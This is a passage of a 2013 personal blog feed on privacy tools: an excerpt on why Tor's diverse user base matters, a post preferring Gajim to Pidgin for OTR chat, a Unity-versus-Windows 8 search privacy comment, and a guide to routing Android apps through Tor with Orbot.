&lt;audio controls="controls" preload="auto" autobuffer=""&gt;&lt;source src="https://s3.amazonaws.com/pressfreedom/bradley_manning_statement/excerpt3.mp3" /&gt;&lt;source src="https://s3.amazonaws.com/pressfreedom/bradley_manning_statement/excerpt3.ogg" /&gt;You are using a browser that doesn&amp;#8217;t support HTML5 audio.&lt;/audio&gt;&lt;blockquote&gt;&lt;p&gt;Tor is a system intended to provide anonymity online. The software routes internet traffic through a network of servers and other Tor clients in order to conceal the user’s location and identity.&lt;/p&gt;
&lt;p&gt;I was familiar with Tor and had it previously installed on a computer to anonymously monitor the social media website of militia groups operating within central Iraq.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Tor’s strength is in its diversity of users. Pretend for a moment that the military set up its own anonymity network for US intelligence analysts and spies to use. If someone (in this case, militia groups operating within central Iraq) notices that the same “anonymous” IP addresses that a known US agent has used keep hitting their server, they know that the IP addresses must belong to a US intelligence analyst or spy.&lt;/p&gt;
&lt;p&gt;However, if a Tor exit IP address keeps hitting their server, they have no idea who it is. It could be someone from the US military, but it could also be a journalist, an activist, a spy from some other country, an organized crime goon, or an ordinary person trying to protect their privacy.&lt;/p&gt;
&lt;p&gt;See the Tor Project’s &lt;a href="https://www.torproject.org/about/torusers.html.en"&gt;Who Uses Tor&lt;/a&gt; page for more information about this concept.&lt;/p&gt;
</content></entry><entry><title>Using Gajim Instead of Pidgin for More Secure OTR Chat</title><link href="https://micahflee.com/2013/02/using-gajim-instead-of-pidgin-for-more-secure-otr-chat/" rel="alternate"></link><updated>2013-02-20T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:2301042d-fc79-37e3-a5df-76d1b5118994</id><content type="html">&lt;p&gt;I’ve been using &lt;a href="http://pidgin.im/"&gt;Pidgin&lt;/a&gt; as my chat client for many years. The one feature of Pidgin that I care about more than any other is that it supports &lt;a href="http://www.cypherpunks.ca/otr/"&gt;Off-the-Record&lt;/a&gt; (OTR).&lt;/p&gt;
&lt;p&gt;If you don’t know about OTR, it’s awesome. It lets you have end-to-end encrypted chat sessions with people so that only you and the person you’re chatting with can read the chat messages and all other parties—such as your chat server (often Google), your ISP, or anyone else eavesdropping on your—cannot. It also has cool features like forward secrecy that other cryptosystems like PGP don’t have. If you’ve ever been to a &lt;a href="https://cryptoparty.org/wiki/CryptoParty"&gt;CryptoParty&lt;/a&gt;, setting up Pidgin and OTR and learning how to verify keys is always on the schedule.&lt;/p&gt;
&lt;p&gt;As awesome as it is, Pidgin and the Pidgin OTR plugin have problems. They rely on the libraries libpurple, libotr and libxml which are massive, written in C/C++, and are littered with memory corruption bugs. In 2011 EFF started the Open Source Security Auditing project and &lt;a href="https://www.eff.org/deeplinks/2011/09/open-source-security-auditing"&gt;fixed several bugs&lt;/a&gt; in Pidgin-related libraries, but that project was far from complete. Just look at Pidgin’s &lt;a href="http://pidgin.im/news/security/"&gt;security advisory page&lt;/a&gt; to see how often Pidgin security bugs get fixed. It’s great that bugs are actively getting fixed in software that experts recommend activists to use, but who knows how many more bugs haven’t been reported to the developers and are actively in use compromising the computers of people who put in extra work to remain secure.&lt;/p&gt;
&lt;p&gt;I recently discovered &lt;a href="https://gajim.org/"&gt;Gajim&lt;/a&gt;, a jabber client written in python. Gajim also has an OTR plugin, but rather than depending on the bug-riddled libotr it uses &lt;a href="https://github.com/afflux/pure-python-otr/"&gt;an implementation of OTR written completely in python&lt;/a&gt; with no C bindings.&lt;/p&gt;
&lt;p&gt;Writing programs in Python is a lot safer than writing them in C. With python, developers don’t get direct access to allocate, overwrite, and free memory. Instead they just declare variables and the python interpreter and it’s garbage collector take care of the messy memory management logic. This means that bugs in a python implementation of jabber and OTR are less likely to lead to arbitrary code execution.&lt;/p&gt;
&lt;p&gt;If someone sends you a malicious message that triggers a bug in Gajim or it’s OTR plugin, they’re much more likely to just crash the program than to take over your computer.&lt;/p&gt;
&lt;p&gt;That said, I noticed that &lt;a href="https://en.wikipedia.org/wiki/Gajim#Security"&gt;Gajim’s Wikipedia page&lt;/a&gt; says:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Despite being written in Python (and thus generally invulnerable to buffer overflow attacks), Gajim has a history of a critical vulnerabilities. Up until late 2011, it was possible to forge a link such that when a receiving Gajim user clicks on it, arbitrary code would be executed on the Gajim user’s machine.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;As far as I know there hasn’t been a formal code review of Gajim. Just because there used to be an arbitrary code execution bug (that’s since been fixed) doesn’t mean that the project as a whole suffers from security problems.&lt;/p&gt;
&lt;p&gt;I’ve only been using Gajim for two days now, but so far it seems great. After installing Gajim you need to click Edit, Plugins, and switch to the Available tab. From there you can download and install the Off-the-Record plugin. Back on the Installed tab you can click Configure to generate OTR keys for your accounts.&lt;/p&gt;
&lt;p&gt;![Gajim plugins][gajim_otr.png]&lt;/p&gt;
&lt;p&gt;I haven’t looked in detail at the plugin installation mechanism for Gajim, so I don’t know if the download goes over HTTPS, or if the package is signed. I hope that both are true, but it’s quite possible that neither is.&lt;/p&gt;
&lt;p&gt;Of course, when Windows users download Pidgin’s OTR plugin from &lt;a href="http://www.cypherpunks.ca/otr/"&gt;cypherpunks.ca&lt;/a&gt;, it’s never been over HTTPS and has never forced signature verification either. We need to work in this.&lt;/p&gt;
&lt;p&gt;I generated a new OTR key when I started using Gajim. But since I’ve already verified OTR keys with dozens of people, and my OTR finerprint is even printed on my business card, I wanted to keep my old OTR key.&lt;/p&gt;
&lt;p&gt;So I decided to write a Pidgin to Gajim conversion script called &lt;a href="https://github.com/micahflee/pidgin2gajim"&gt;pidgin2gajim&lt;/a&gt;. If you too want to switch to Gajim but don’t want to give up your existing OTR key, hopefully this will be helpful.&lt;/p&gt;
&lt;p&gt;I also posted a feature request on the &lt;a href="https://github.com/afflux/pure-python-otr/"&gt;pure-python-otr&lt;/a&gt; project to &lt;a href="https://github.com/afflux/pure-python-otr/issues/30"&gt;add an “Import From Pidgin” button&lt;/a&gt; to the Gajim OTR user interface, which will make this process much easier for users.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Update: After talking to some people it appears that libotr isn’t as bug-ridden as the other libraries that Pidgin depends on, libpurple and libxml2. I’m still glad there’s a native python implementation of OTR though.&lt;/em&gt;&lt;/p&gt;
</content></entry><entry><title>Unity vs. Windows 8</title><link href="https://micahflee.com/2013/02/unity-vs-windows-8/" rel="alternate"></link><updated>2013-02-02T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:3aeb464e-07a5-320e-83d2-322d71e1ee40</id><content type="html">&lt;p&gt;I posted this as a comment on my previous blog post, &lt;a href="https://micahflee.com/2013/01/why-im-leaving-ubuntu-for-debian"&gt;Why I’m Leaving Ubuntu for Debian&lt;/a&gt;. I decided it’s worth it’s own post though.&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Ubuntu is definitely maturing into, and has been for some time, an excellent alternative OS to Windows. Perhaps that bothers some Linux users who like their OS to be exclusive and harder to use so they can feel cooler, but I’m not one of them. I think Ubuntu’s popularity is great.&lt;/p&gt;
&lt;p&gt;Which is why it saddens me to see Canonical make decisions that are specifically anti-privacy.&lt;/p&gt;
&lt;p&gt;Windows 8 has a unified search, similar to Dash. If you want to find a specific show in Netflix in Windows 8, you actually go to the operating system-wide search and search for your show there, and just select Netflix as what you’re trying to search.&lt;/p&gt;
&lt;p&gt;But there’s the key difference: you have to select Netflix, or you aren’t sending your search terms to Netflix. If Netflix ever came to Linux, and there was a Netflix Dash lense, you would be sending &lt;strong&gt;every single search term&lt;/strong&gt; to Netflix, not just when you intended to search Netflix for a show.&lt;/p&gt;
&lt;p&gt;Windows 8, as horrible and confusing to use as is it, protects privacy better than Unity does (in this regard). And Canonical knows this, because we (users of Ubuntu) have told them very loudly, but they’ve chosen to ignore it. That’s what bothers me about Ubuntu, that it sacrifices privacy for perceived gain in market share. They can do it without sacrificing privacy, but they aren’t.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And yes, obviously you can turn off Dash’s online search results and uninstall unity-lens-shopping. Obviously you can use Ubuntu with GNOME or KDE or whatever else instead of Unity. That’s not the point.&lt;/p&gt;
&lt;p&gt;You can also use Debian with GNOME or KDE or whatever else. In fact, once you have it installed, it’s really similar to Ubuntu, because it uses the same software, because Ubuntu is based on it. For a seasoned Ubuntu user, once Debian is installed it isn’t harder to use or anything. So why stick with a distro that makes crappy choices and refuses to learn from their mistakes?&lt;/p&gt;
</content></entry><entry><title>Mobile Location Anonymity: Proxying Twitter, IM, and Email through Tor on Android</title><link href="https://micahflee.com/2013/02/mobile-location-anonymity-proxying-twitter-im-and-email-through-tor-on-android/" rel="alternate"></link><updated>2013-02-01T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:c92152b4-bcd5-353d-8c71-ea72f9c16991</id><content type="html">&lt;p&gt;Each time your computer makes a connection to a server on the internet, you tell the remote server, as well as your ISP and every router in between, your IP address. If you’re using the internet on your phone you might be disclosing the IP of your 3G or 4G connection, or the IP of the wifi network you’re connected to.&lt;/p&gt;
&lt;p&gt;If your phone checks for new emails or tweets every couple minutes, or keeps up a consistent connection to your instant messenger server, any of those services is almost definitely logging a history of your IP addresses.&lt;/p&gt;
&lt;p&gt;This IP address data could be used to figure out your physical location over time. This is the information that &lt;a href="https://www.eff.org/cases/new-york-v-harris"&gt;New York City subpoenaed Twitter for&lt;/a&gt;, to get the private messages and IP addresses (read: location data) of Occupy protester Malcolm Harris.&lt;/p&gt;
&lt;p&gt;If you use an Android phone, you don’t need to share your IP address with those service providers anymore.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Orbot: Tor for Android&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;To get started, open up Google Play and go find the app Orbot: Tor on Android (&lt;a href="https://guardianproject.info/apps/orbot/"&gt;official website&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;&lt;img src="orbot_google_play.png" alt="Orbot in Google Play"&gt;&lt;/p&gt;
&lt;p&gt;When you open Orbot for the first time you’ll see a series of pages. Choose your language and click next until you get to the Permissions page.&lt;/p&gt;
&lt;p&gt;&lt;img src="orbot_4_root1.png" alt="Orbot: requesting root"&gt;&lt;/p&gt;
&lt;p&gt;If you don’t have a rooted phone, that’s fine. You just won’t be able to proxy your email through Tor, but Twitter, and IM, and other apps that were designed to work with Orbot will work fine.&lt;/p&gt;
&lt;p&gt;If you do have a rooted phone, go ahead and Request Superuser Access.&lt;/p&gt;
&lt;p&gt;&lt;img src="orbot_4_root2.png" alt="Orbot: receiving root"&gt;&lt;/p&gt;
&lt;p&gt;If you have given Orbot root access, the next page should be Transparent Proxying. This is one of the coolest features of Orbot. You get to choose which apps on your phone get all of their traffic proxied through Tor, even if those apps don’t support proxy servers.&lt;/p&gt;
&lt;p&gt;&lt;img src="orbot_5_transparent1.png" alt="Transparent proxying in Orbot"&gt;&lt;/p&gt;
&lt;p&gt;You can also choose to proxy all apps through Tor if you want, but keep in mind that everything on your phone will be really, really slow if you do this. Also, you might not want to. Some apps (most apps?) still communicate with their servers over HTTP rather than HTTPS, and when you’re using Tor the exit node can sniff your traffic. Proxying insecure apps over Tor might be a security issue. See &lt;a href="https://www.eff.org/pages/tor-and-https"&gt;Tor and HTTPS&lt;/a&gt; to understand exactly how Tor and HTTPS work together.&lt;/p&gt;
&lt;p&gt;Go ahead and click “Select Individual Apps for Tor”. A list of all of the apps installed on your system should pop up, with check boxes next to them. You can proxy whatever you want through Tor, but I’m just doing my Email app.&lt;/p&gt;
&lt;p&gt;&lt;img src="orbot_5_transparent2.png" alt="Proxying specific apps"&gt;&lt;/p&gt;
&lt;p&gt;Next, Orbot will show you a list of apps that have been designed to work with Tor. This list includes Gibberbot and Twitter (more about them below), as well as other apps like DuckDuckGo and Firefox.&lt;/p&gt;
&lt;p&gt;Click through until you get to the giant button with the pretty background, and start Tor.&lt;/p&gt;
&lt;p&gt;&lt;img src="orbot_app.png" alt="Orbot main screen"&gt;&lt;/p&gt;
&lt;p&gt;If you want to change any Tor settings, including the list of apps that you transparently proxy, you can click the settings button on the right side of the top bar.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;More About Proxying Email Through Tor&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;As far as I know, there aren’t any email apps for Android that natively support proxy servers. &lt;a href="https://play.google.com/store/apps/details?id=com.fsck.k9&amp;amp;hl=en"&gt;K-9 Mail&lt;/a&gt;, the major free software Android email client, will hopefully implement this soon. There’s a K-9 Google Summer of Code &lt;a href="https://github.com/k9mail/k-9/wiki/GSoC-Project-Ideas#wiki-Proxy_server_support"&gt;project idea&lt;/a&gt; for it, as well as an &lt;a href="https://code.google.com/p/k9mail/issues/detail?id=2834"&gt;open bug&lt;/a&gt; in their bug tracker. But until that happens, you can only tunnel your email traffic through Tor if you’ve rooted your phone.&lt;/p&gt;
&lt;p&gt;Proxying your email is sometimes especially important, depending on your mail server configuration. Some mail servers leak your IP address in the SMTP headers of outbound emails, which means, for example, if you write an email to a public mailing list from your phone, it’s not just your mail server, your ISP, and your government who might learn your IP address. It’s anyone who is subscribed to that mailing list, or is able to download mailing list archives with headers intact.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Tunnel Twitter Through Tor&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Twitter has built-in support for proxy servers. Just open up the Twitter app, press the menu button on your phone.&lt;/p&gt;
&lt;p&gt;&lt;img src="twitter_menu.png" alt="Twitter Menu Button"&gt;&lt;/p&gt;
&lt;p&gt;Open Settings.&lt;/p&gt;
&lt;p&gt;&lt;img src="twitter_settings.png" alt="Twitter settings"&gt;&lt;/p&gt;
&lt;p&gt;Under advanced, click Proxy and set your proxy settings like this:&lt;/p&gt;
&lt;p&gt;&lt;img src="twitter_proxy.png" alt="Twitter app proxy settings"&gt;&lt;/p&gt;
&lt;p&gt;While you’re in your Twitter settings, make sure “Location: Allow Twitter to use your location” in unchecked, or you’re somewhat defeating the purpose :).&lt;/p&gt;
&lt;p&gt;I find that for Twitter, as well as email, proxying through Tor isn’t too slow at all since it’s only sort of real-time. The one exception I’ve noticed is if you’re using a crappy 3G connection and trying to tweet a photograph over Tor. Last time I tried this, it failed each time and I just gave up until I found wifi.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Tunnel Instant Messenger Through Tor, Plus Off-the-Record&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://guardianproject.info/apps/gibber/"&gt;Gibberbot&lt;/a&gt; is an Android jabber client that has been specifically designed to work with Orbot. And, more excitingly, it’s has &lt;a href="http://www.cypherpunks.ca/otr/"&gt;Off-the-Record&lt;/a&gt; (OTR) end-to-end encryption built-in. This means that you if you’re chatting with other people who use OTR, the contents of your chats are encrypted so that even your chat server can’t see what you’re saying. Of course, you’ll need to verify identities before you can be sure you’re chat conversion is secure.&lt;/p&gt;
&lt;p&gt;Other chat clients that support OTR are: &lt;a href="http://pidgin.im/"&gt;Pidgin&lt;/a&gt; for Windows and Linux, &lt;a href="http://adium.im/"&gt;Adium&lt;/a&gt; for Mac OS X, and &lt;a href="http://chrisballinger.info/apps/chatsecure/"&gt;ChatSecure&lt;/a&gt; for iOS.&lt;/p&gt;
&lt;p&gt;Gibberbot is an jabber client, which means that it will work with Google Talk or other jabber services that you can create free accounts on, such as jabber.org or jabber.ccc.de. Start by downloading Gibberbot from Google Play.&lt;/p&gt;
&lt;p&gt;&lt;img src="gibberbot_google_play.png" alt="Gibberbot in Google Play"&gt;&lt;/p&gt;
&lt;p&gt;The first time you open it it will ask your language and then there will be several screens of information. If you’ve never used OTR before, it’s definitely worth a read.&lt;/p&gt;
&lt;p&gt;It’s really easy to use Gibberbot over Tor. When you’re adding a new chat account, there’s a “Connect via Tor (Requires Orbot app)” checkbox. Just check that box, and then enter your jabber credentials (such as your Google account username and password), and your connections to your chat server will be proxied through Tor.&lt;/p&gt;
&lt;p&gt;&lt;img src="gibberbot_login.png" alt="Gibberbot login screen"&gt;&lt;/p&gt;
&lt;p&gt;If you do use Google Talk, you might run into trouble with Google rejecting your connection. Google does all sorts of security stuff to prevent your account from getting hacked. If you’ve never logged in to your account from a Tor exit node, it might automatically block the connection until you login to your Google account on a computer and take steps to specifically allow it. This shouldn’t be a problem with other jabber services. If you use another jabber service, such as jabber.org, you will still be able to chat with people who use Google Talk.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Browse the Web Through Tor&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In case you want to manually browse the web through to Tor to protect your identity rather than just your location, that’s easy too. Download the &lt;a href="https://guardianproject.info/apps/orweb/"&gt;Orweb&lt;/a&gt; app from Google Play.&lt;/p&gt;
&lt;p&gt;&lt;img src="orweb_google_play.png" alt="Orweb in Google Play"&gt;&lt;/p&gt;
&lt;p&gt;If Orbot is running in the background and you have an active connection to the Tor network, all you have to do to browse the web anonymously from your phone is use Orweb.&lt;/p&gt;
&lt;p&gt;&lt;img src="orweb.png" alt="Orweb in use"&gt;&lt;/p&gt;
</content></entry></feed>